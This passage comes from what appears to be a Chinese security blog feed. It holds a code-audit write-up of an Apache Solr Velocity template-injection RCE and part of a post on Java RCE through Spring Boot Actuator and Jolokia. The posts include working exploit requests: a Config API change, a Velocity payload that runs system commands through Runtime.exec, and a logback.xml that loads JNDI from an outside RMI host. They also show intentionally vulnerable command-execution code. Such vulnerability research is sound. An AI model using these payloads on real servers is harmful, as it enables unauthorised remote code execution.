class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 259</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317150202155.png" alt="在这里插入图片描述"></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317151703268.png" alt="在这里插入图片描述"></p><hr><h2 id="漏洞分析环境搭建"><a href="#漏洞分析环境搭建" class="headerlink" title="漏洞分析环境搭建"></a>漏洞分析环境搭建</h2><p>&emsp;&emsp; 笔者在此是使用远程代码调试的方式，分析源码。<a href="https://archive.apache.org/dist/lucene/solr/8.2.0/" target="_blank" rel="noopener">源码下载地址</a>windows用户可以选择下载这两个，这里笔者下载下载第二个。（下载第一个需要编译，过程自行百度）<br><img src="https://img-blog.csdnimg.cn/20200317160246408.png" alt="在这里插入图片描述"></p><ol><li><p>解压，将源码导入idea中，并配置idea中远程代码调试。<br><img src="https://img-blog.csdnimg.cn/20200317160450347.png" alt="在这里插入图片描述"></p></li><li><p>在第二个下载压缩包路径CMD环境下（~~\solr-8.2.0\bin\），启动命令<code>solr start -p 8983 -f -a &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8983&quot;</code><br><img src="https://img-blog.csdnimg.cn/20200317161340408.png" alt="在这里插入图片描述"></p></li><li><p>用idea打开项目，导入jar文件设置为library。（还有几处在solr-8.2.0\contrib\velocity\lib、solr-8.2.0\server\lib……）<br><img src="https://img-blog.csdnimg.cn/20200323143907966.png" alt="在这里插入图片描述"></p></li><li><p>打断点调试代码。分析一个web项目首先我们得看web.xml文件<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\web.xml</code>，看第一句，发现<code>在solrconfig.xml中注册的任何路径（名称）都将发送到该过滤器</code>。<br><img src="https://img-blog.csdnimg.cn/20200321153010735.png" alt="在这里插入图片描述"></p></li></ol><ul><li>断点位置，为什么会在这里打个断点，笔者翻阅资料得知这里是核心位置。具体参考<a href="https://my.oschina.net/haitaohu/blog/3078667" target="_blank" rel="noopener">solr源码阅读</a>。<br><img src="https://img-blog.csdnimg.cn/20200321154555773.png" alt="在这里插入图片描述"></li></ul><hr><h2 id="漏洞成因分析-–-代码层"><a href="#漏洞成因分析-–-代码层" class="headerlink" title="漏洞成因分析 – 代码层"></a>漏洞成因分析 – 代码层</h2><h3 id="POC第一部分"><a href="#POC第一部分" class="headerlink" title="POC第一部分"></a>POC第一部分</h3><p>&emsp;&emsp; 第一部分分析请查看<a href="https://www.w3cschool.cn/solr_doc/solr_doc-wcyd2hyj.html" target="_blank" rel="noopener">Solr配置API：Config API</a>文档，文档中说明的很清楚。PS：漏洞复现的时候也有说明。<br><img src="https://img-blog.csdnimg.cn/2020032319153017.png?" alt="在这里插入图片描述"></p><hr><h3 id="POC后部分分析"><a href="#POC后部分分析" class="headerlink" title="POC后部分分析"></a>POC后部分分析</h3><ol><li>笔者这里直接说几个关键的部分代码<br>第一步先处理请求<br><img src="https://img-blog.csdnimg.cn/20200324135210989.png" alt="在这里插入图片描述"><ol start="2"><li><code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\SolrDispatchFilter.class</code>跳转到<code>E:\Soures\solr-8.2.0\server\solr-webapp\webapp\WEB-INF\lib\solr-core-8.2.0.jar!\org\apache\solr\servlet\HttpSolrCall.class</code> 先处理参数wt，设置为velocity。<br><img src="https://img-blog.csdnimg.cn/20200324140636319.png" alt="在这里插入图片描述"></li><li>写入响应<br><img src="https://img-blog.csdnimg.cn/202003241354181.png" alt="在这里插入图片描述"></li><li>判断方法，写查询响应，进一步查看内容。solrReuest就是我们的payload。<br><img src="https://img-blog.csdnimg.cn/2020032414122987.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141356198.png" alt="在这里插入图片描述"></li><li>跳转到velocityResponWriter.class,会创建velocity模板引擎。在到133行的位置进入模板方法<br><img src="https://img-blog.csdnimg.cn/20200324141530325.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200324141916156.png" alt="在这里插入图片描述"></li><li>在这里会跳转到SimpleNode.class类（我们熟悉的类），第一步会设置指引，接着会到ASTReference.class 在第八的位置，会遍历方法，会执行命令。<br><img src="https://img-blog.csdnimg.cn/20200324142424569.png" alt="在这里插入图片描述"></li><li>在这里会跳转到ASTMethod类中，执行。<br><img src="https://img-blog.csdnimg.cn/20200324143631629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200324143501469.png" alt="在这里插入图片描述"></li><li>具体执行是velocity模板引擎中有一个ClassMap类中。<br><img src="https://img-blog.csdnimg.cn/20200323201336890.png" alt="在这里插入图片描述"></li></ol></li></ol><hr><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a><strong>知识补充</strong></h2><p>&emsp;&emsp; 在前面有涉及到JJTree、payload构造、JavaCC等知识，但笔者并没有详细的说明，笔者想先读者们简单了解一下这些知识，然后在说明一下简单做个简单说明。</p><h2 id="set语法"><a href="#set语法" class="headerlink" title="#set语法"></a><strong>#set语法</strong></h2><p>&emsp;&emsp; #set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($var=“偶数”)，另外是一个set方法调用，如#set($person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。</p><h2 id="foreach语法"><a href="#foreach语法" class="headerlink" title="#foreach语法"></a><strong>#foreach语法</strong></h2><p>Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($child in $person.children) $person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int i=1;i&lt;10;i++)中的i值，后者相当于while(it.hasNext())中的it.hasNext()的值，这两个值在#foreach的循环体中都有可能用到。由于elementKey、counterName和hasNextName是在#foreach中临时创建的，如果当前的context中已经存在这几个变量，要把原始的变量值保存起来，以便在这个#foreach执行结束后恢复。如果context中没有这几个变量，那么#foreach执行结束后要删除它们，这就是代码最后部分做的事情，这与我们前面介绍的#set语法没有范围限制不同，#foreach中临时产生的变量只在#foreach中有效。</p><h2 id="JJTree渲染过程解析"><a href="#JJTree渲染过程解析" class="headerlink" title="JJTree渲染过程解析"></a><strong>JJTree渲染过程解析</strong></h2><p>下面是JJTree的语法树：<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE1LmNuYmxvZ3MuY29tL2Jsb2cvOTkwNTMyLzIwMTYxMC85OTA1MzItMjAxNjEwMjUxNTI3NDM3NTAtMTA4MzgwODIyOC5wbmc?x-oss-process=image/format,png" alt></p><h2 id="关于POC构造方法补充说明"><a href="#关于POC构造方法补充说明" class="headerlink" title="关于POC构造方法补充说明"></a><strong>关于POC构造方法补充说明</strong></h2><p><strong>VelocityResponseWriter 初始化参数</strong></p><ul><li>template.base.dir<br>如果指定并作为文件系统目录存在，则将为此目录添加一个文件资源加载程序。此目录中的模板将覆盖 “solr” 资源加载程序模板。 </li><li>init.properties.file<br>指定一个属性文件名，必须存在于 Solr 的conf/目录（而不是在velocity/子目录中）或者 <lib> 的 JAR 文件的根中。 </lib></li><li>params.resource.loader.enabled<br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：</li></ul><p><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_namev.template=custom</code>表示要呈现一个名为“自定义”的模板，其值<code>v.template.custom</code>是自定义模板。默认情况下为<code>false</code>；它不常用，需要时启用。</p><ul><li>solr.resource.loader.enabled<br>“solr” 资源加载程序是默认注册的唯一模板加载程序。模板是由 SolrResourceLoader 从velocity/子目录下可见的资源提供的。VelocityResponseWriter 本身有一些内置的模板（在它 JAR 文件中的velocity/），这些模板可以通过这个加载程序自动使用。当相同的模板名称处于 conf/velocity/ 或使用template.base.dir选项时，可以覆盖这些内置模板。 </li></ul><hr><p><strong>VelocityResponseWriter请求参数</strong></p><ul><li><p>v.template<br>指定要呈现的模板的名称。</p></li><li><p>v.layout<br>指定一个模板名称，用作围绕主<code>v.template</code>指定模板的布局。<br>主模板呈现为包含在布局渲染中的字符串值$content。</p></li><li><p>v.layout.enabled<br>确定主模板是否应该有围绕它的布局。默认是<code>true</code>，但也需要指定<code>v.layout</code>。<br>v.contentType<br>指定 HTTP 响应中使用的内容类型。如果没有指定，默认取决于是否指定<code>v.json</code>。<br>默认情况下不包含<code>v.json=wrf：text/html;charset=UTF-8</code>。<br>默认为<code>v.json=wrf：application/json;charset=UTF-8</code>。</p></li><li><p>v.json<br>指定一个函数名称来包装呈现为 JSON 的响应。如果指定，则响应中使用的内容类型将为“application / json; charset = UTF-8”，除非被<code>v.contentType</code>覆盖。<br>输出将采用以下格式（带<code>v.json=wrf</code>）：</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrf(&quot;result&quot;:&quot;&lt;Velocity generated response string, with quotes and backslashes escaped&gt;&quot;)</span><br></pre></td></tr></table></figure></li><li><p>v.locale<br>使用<code>$resource</code>工具和其他 LocaleConfig 实现工具的语言环境。默认语言环境是<code>Locale.ROOT</code>。本地化资源从名为<code>resources[_locale-code].properties</code>的标准 Java 资源包中加载<br>可以通过提供由 SolrResourceLoader 在速度子下的资源包可见的 JAR 文件来添加资源包。资源包不能在<code>conf/</code>下加载，因为只有 SolrResourceLoader 的类加载程序方面可以在这里使用。</p></li><li><p>v.template.template_name<br>当启用 “params” 资源加载程序时，可以将模板指定为 Solr 请求的一部分。<br><code>params.resource.loader.enabled</code><br>“params” 资源加载程序允许在 Solr 请求参数中指定模板。例如：<br><code>http://localhost:8983/solr/gettingstarted/select?q=\*:*&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=CUSTOM%3A%20%23core_name</code></p></li></ul><hr><ol><li>先将poc进行解码<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;test&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;#set($x&#x3D;&#39;&#39;) #set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;)) #set($chr&#x3D;$x.class.forName(&#39;java.lang.Character&#39;)) #set($str&#x3D;$x.class.forName(&#39;java.lang.String&#39;)) #set($ex&#x3D;$rt.getRuntime().exec(&#39;calc&#39;)) $ex.waitFor() #set($out&#x3D;$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure></li><li>set和foreach语法前面都介绍了，现在在看payload是不是就一目了然了？如何构造，为什么这么构造..<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x='')  </span><br><span class="line">#set($rt=$x.class.forName('java.lang.Runtime'))</span><br><span class="line">#set($chr=$x.class.forName('java.lang.Character'))  </span><br><span class="line">#set($str=$x.class.forName('java.lang.String'))</span><br><span class="line">#set($ex=$rt.getRuntime().exec('calc'))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/2020031621445369.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200316214532444.png" alt="在这里插入图片描述"></li></ol><hr><p><strong>附图：各框架模板结构：</strong><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9wNS5zc2wucWhpbWcuY29tL3QwMWY0NzkyYzdkMDNkZDQ5Y2MucG5n?x-oss-process=image/format,png" alt></p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p>&emsp;&emsp; Apache Solr的<code>Config API</code>是自带功能，用于通过HTTP请求更改配置；当Solr未设置访问鉴权时，可以直接通过ConfigAPI更改配置，为漏洞利用创造了前提。config api是solr多此爆出漏洞关键<a href="https://github.com/Imanfeng/Apache-Solr-RCE" target="_blank" rel="noopener">Apache Solr RCE</a>有想法的童鞋可以看看这个项目。</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>&emsp;&emsp; 之前刚刚爆出漏洞的时候，笔者还曾复现过，但奈何能力有限，不能深入理解其中内涵。深表惭愧，总的来说，努力学习，安全一行任重而道远。</p><hr><h1 id="推荐学习资料"><a href="#推荐学习资料" class="headerlink" title="推荐学习资料"></a>推荐学习资料</h1><p>&emsp;&emsp; 想进行深入研究此漏洞肯定光看我这篇文章是不足的，毕竟我这这个只是Java方面上的，python、php等语言都没介绍。故此推荐，望彼有助。</p><p><strong>国内资料</strong></p><p>Python方面：<a href="https://www.anquanke.com/post/id/188172" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br>PHP方面：<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）之浅析</a></p><p><strong>国外资料</strong></p><p>这篇总结的比较全面：<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">Server-Side Template Injection: RCE for the modern webapp</a><br>Python方面：<a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">Jinja2 template injection filter bypasses</a></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.liangzl.com/get-article-detail-138970.html" target="_blank" rel="noopener">https://www.liangzl.com/get-article-detail-138970.html</a><br><a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a><br><a href="https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355" target="_blank" rel="noopener">https://cert.360.cn/report/detail?id=6125d7f75170c309de1ffdde11f86355</a><br><a href="https://paper.seebug.org/1107/#41" target="_blank" rel="noopener">https://paper.seebug.org/1107/#41</a><br><a href="https://ackcent.com/blog/in-depth-freemarker-template-injection/" target="_blank" rel="noopener">https://ackcent.com/blog/in-depth-freemarker-template-injection/</a><br><a href="https://www.cnblogs.com/wade-luffy/p/5996848.html" target="_blank" rel="noopener">https://www.cnblogs.com/wade-luffy/p/5996848.html</a><br><a href="https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html" target="_blank" rel="noopener">https://www.w3cschool.cn/solr_doc/solr_doc-umxd2h9z.html</a><br><a href="https://blog.csdn.net/weixin_38964895/article/details/81381060" target="_blank" rel="noopener">https://blog.csdn.net/weixin_38964895/article/details/81381060</a><br><a href="https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/sweety820/article/details/74347068?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;为什么说Java审计南在SSTI呢？&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;现行SSTI(Server-Side Te
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java SSTI" scheme="https://summersec.github.io/tags/Java-SSTI/"/>
    
  </entry>
  
  <entry>
    <title>春眠不觉晓，RCE知多少？</title>
    <link href="https://summersec.github.io/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
    <id>https://summersec.github.io/2020/03/03/%E6%98%A5%E7%9C%A0%E4%B8%8D%E8%A7%89%E6%99%93%EF%BC%8CRCE%E7%9F%A5%E5%A4%9A%E5%B0%91%EF%BC%9F/</id>
    <published>2020-03-03T04:42:16.000Z</published>
    <updated>2020-05-05T13:15:59.889Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul><li>读者受众：所有人</li><li>阅读要求：30mins</li><li>文章中2620还没写完，清水川崎大佬就爆2634了，据说他还藏了很多个0day</li></ul><p><img src="https://img-blog.csdnimg.cn/20200303122905453.png" alt="在这里插入图片描述"></p><hr><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简单案例分析RCE"><a href="#简单案例分析RCE" class="headerlink" title="简单案例分析RCE"></a>简单案例分析RCE</h2><p><img src="https://img-blog.csdnimg.cn/20200215130716340.png" alt="在这里插入图片描述"></p><p>&emsp;&emsp; 通过Java执行系统命令，与cmd中或者终端上一样执行shell命令，最典型的用法就是使用Runtime.getRuntime().exec(command)或者new ProcessBuilder(cmdArray).start()。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//漏洞源码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">CommandExec</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        String cmd = request.getParameter(<span class="string">"cmd"</span>).toString();</span><br><span class="line">        Runtime run = Runtime.getRuntime();</span><br><span class="line">        String lineStr = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Process p = run.exec(cmd);</span><br><span class="line">            BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((tmpStr = inBr.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                lineStr += tmpStr + <span class="string">"\n"</span>;</span><br><span class="line">                System.out.println(tmpStr);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>漏洞成因分析</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: 开始获取cmd参数值</span><br><span class="line">e&#x3D;&gt;end: 输出返回值</span><br><span class="line">op1&#x3D;&gt;operation: 执行命令（过程类似Runtime.getRuntime().exec(command)）</span><br><span class="line">st-&gt;op1-&gt;e</span><br></pre></td></tr></table></figure><p>&emsp;&emsp; 流程图显示的代码执行的过程，不难发现我们没有看到过滤参数，判断参数是否输入正确的一系列操作，从而导致的<code>命令执行漏洞</code>。</p><p><strong>说明：</strong></p><ol><li>process指向一个本地进程，相对于main进程来说，process指向的称为子进程。<a href="https://blog.csdn.net/dataiyangu/article/details/83988654" target="_blank" rel="noopener">^1</a></li><li>BufferedInputStream 是缓冲输入流，它继承FilterInputStream类。BufferedInputStream 的作用是为另一个输入流添加一些功能，例如，提供“缓冲功能”以及支持“mark()标记”和“reset()重置方法”。BufferedInputStream 本质上是通过一个内部缓冲区数组实现的。例如，在新建某输入流对应的BufferedInputStream后，当我们通过read()读取输入流的数据时，BufferedInputStream会将该输入流的数据分批的填入到缓冲区中。每当缓冲区中的数据被读完之后，输入流会再次填充数据缓冲区；如此反复，直到我们读完输入流数据位置。[^2]</li></ol><hr><h2 id="知识内容补充"><a href="#知识内容补充" class="headerlink" title="知识内容补充"></a>知识内容补充</h2><p> <strong>继续阅读下面的内容，你需要补充更多知识。</strong></p><ol><li>Java序列化和反序列化</li><li>RMI、JRMP、JMX、JNDI</li><li>JNDI注入原理</li></ol><p>笔者在此，做一个简单介绍。</p><ul><li>Java序列化对象因其可以方便的将对象转换成字节数组，又可以方便快速的将字节数组反序列化成Java对象而被非常频繁的被用于Socket传输。 在RMI(Java远程方法调用-Java Remote Method Invocation)和JMX(Java管理扩展-Java Management Extensions)服务中对象反序列化机制被强制性使用。在Http请求中也时常会被用到反序列化机制，如：直接接收序列化请求的后端服务、使用Base编码序列化字节字符串的方式传递等。</li><li>Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。</li><li>JRMP（ Java Remote Method Protocol）协议通信，用于规范远程方法调用的协议</li><li>Java命名和目录接口（Java Naming and Directory Interface，缩写JNDI），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。</li><li>关于JNDI注入百度有很多文章，推荐<a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a>、<a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入原理及利用</a></li></ul><p><strong>推荐文章：</strong></p><ul><li><a href="https://javasec.org/javase/JavaDeserialization/Serialization.html" target="_blank" rel="noopener">Java 序列化/反序列化</a></li><li><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></li><li><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">搞懂RMI、JRMP、JNDI-终结篇</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">MicroFocus研究论文(纯英文)</a></li><li><a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java" target="_blank" rel="noopener">Exploiting JNDI Injections in Java</a></li></ul><hr><h2 id="Spring-Boot-Actuators-to-RCE"><a href="#Spring-Boot-Actuators-to-RCE" class="headerlink" title="Spring Boot Actuators to RCE"></a>Spring Boot Actuators to RCE</h2><p>&emsp;&emsp; Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息。</p><p>&emsp;&emsp; 使用老外提供的源码，用mvn编译运行。<a href="https://github.com/veracode-research/actuator-testbed" target="_blank" rel="noopener">GitHub项目地址</a>直接访问<code>http://127.0.0.1:8090/jolokia/list</code><br>或者修改ip和端口<code>actuator-testbed\src\main\resources\application.properties</code></p><p><img src="https://img-blog.csdnimg.cn/20200225152718508.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200225152401453.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200228131827582.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 上面的<code>reloadByURL</code>可以加载一个外部URL进而重新加载日志配置，结果造成了RCE。我们需要构造一个恶意logback.xml的URL。<br><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//下面是logback.xml内容</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">"rmi://artsploit.com:1389/jndi"</span> <span class="attr">as</span>=<span class="string">"appName"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>rmi和ldap服务都能触发这个漏洞，笔者在这里选择rmi服务。</p><p><img src="https://img-blog.csdnimg.cn/20200227143151844.gif" alt="在这里插入图片描述"><br><strong>简单的触发流程流程图：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">flowchat</span><br><span class="line">st&#x3D;&gt;start: Spring-boot-actuator</span><br><span class="line">e&#x3D;&gt;end: RCE</span><br><span class="line">op&#x3D;&gt;operation: Jolokia</span><br><span class="line">op2&#x3D;&gt;operation: RMI</span><br><span class="line">cond&#x3D;&gt;condition: logback.xml?</span><br><span class="line"></span><br><span class="line">st-&gt;op-&gt;op2-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op2</span><br></pre></td></tr></table></figure><hr><p><strong>源码分析</strong></p><ol><li>第一步会先注册jolokia<br><img src="https://img-blog.csdnimg.cn/20200229132647972.png#pic_center" alt="在这里插入图片描述"></li><li><a href="http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml" target="_blank" rel="noopener">http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/httpserver_ip/logback.xml</a><br>看上面URL分析<code>reloadByURL</code>很重要，看一下源码<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 